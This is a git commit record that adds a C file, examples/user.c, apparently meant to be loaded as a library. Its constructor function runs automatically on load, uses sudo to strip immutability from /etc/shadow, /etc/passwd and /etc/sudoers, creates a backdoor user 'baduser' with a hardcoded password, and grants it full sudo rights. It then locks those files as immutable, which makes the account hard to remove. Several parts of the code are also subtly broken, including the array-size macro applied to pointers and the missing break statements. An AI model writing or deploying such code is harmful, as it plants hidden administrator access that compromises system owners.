92e0b582bfe288852a3866096e3faa1e2893cf12
hl4x <hl4x@proton.me>
2025-02-14 21:53:42 +0000

    changes to examples

---
+++ examples/user.c
@@ -0,0 +1,93 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <pwd.h>
+#include <crypt.h>
+#include <sys/wait.h>
+#include <string.h>
+
+#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))
+#define DEFAULT_CHATTR_ARG_SIZE 4
+
+void close_fds(int fds[])
+{
+	for (unsigned int i = 0; i < ARRAY_SIZE(fds); i++)
+		close(fds[i]);
+	return;
+}
+
+void chattr_remove(char *files[])
+{
+	unsigned int size = ARRAY_SIZE(files);
+	char *argv[DEFAULT_CHATTR_ARG_SIZE + size];
+	memset(argv, 0, sizeof(argv));
+	argv[0] = "/usr/bin/sudo";
+	argv[1] = "/usr/bin/chattr";
+	argv[2] = "-i";
+	for (unsigned int i = 0; i < size; i++)
+		argv[DEFAULT_CHATTR_ARG_SIZE - 1 + i] = files[i];
+	argv[DEFAULT_CHATTR_ARG_SIZE + size] = NULL;
+	char *envp[] = { NULL };
+	execve(argv[0], argv, envp);
+}
+
+void chattr_add(char *files[])
+{
+	unsigned int size = ARRAY_SIZE(files);
+	char *argv[DEFAULT_CHATTR_ARG_SIZE + size];
+	memset(argv, 0, sizeof(argv));
+	argv[0] = "/usr/bin/sudo";
+	argv[1] = "/usr/bin/chattr";
+	argv[2] = "+i";
+	for (unsigned int i = 0; i < size; i++)
+		argv[DEFAULT_CHATTR_ARG_SIZE - 1 + i] = files[i];
+	argv[DEFAULT_CHATTR_ARG_SIZE + size] = NULL;
+	char *envp[] = { NULL };
+	execve(argv[0], argv, envp);
+}
+
+int __attribute__((constructor)) ctor() 
+{
+	char *files[] = { "/etc/shadow", "/etc/passwd", "/etc/sudoers" };
+
+	char *username = "baduser";
+	char *password = "password";
+
+	struct passwd *pw = getpwnam(username);
+	if (!pw) {
+		char *salt = "$6$random_salt$"; 		
+		char *hashed_password = crypt(password, salt);
+		if (!hashed_password) {
+			return 0;
+		}
+		pid_t pid = fork();
+		switch(pid) {
+			case -1:
+				return 0;
+			case 0:
+				chattr_remove(files);
+			default:
+				wait(NULL);
+		}
+		pid = fork();
+		switch(pid) {
+			case -1:
+				return 0;
+			case 0:
+				char *argv[] = { "/usr/bin/sudo", "/usr/sbin/useradd", username, "-p", hashed_password, "-m", NULL };
+				char *envp[] = { NULL };	
+				execve(argv[0], argv, envp);
+			default:
+				wait(NULL);
+		}
+		char *argv[] = { "/usr/bin/sudo", "/bin/bash", "-c", "echo 'baduser ALL=(ALL) ALL' >> /etc/sudoers", NULL};
+		char *envp[] = { NULL };
+		execve(argv[0], argv, envp);
+	} else {
+		chattr_add(files);	
+	}
+
+    	return 0;
+}
+
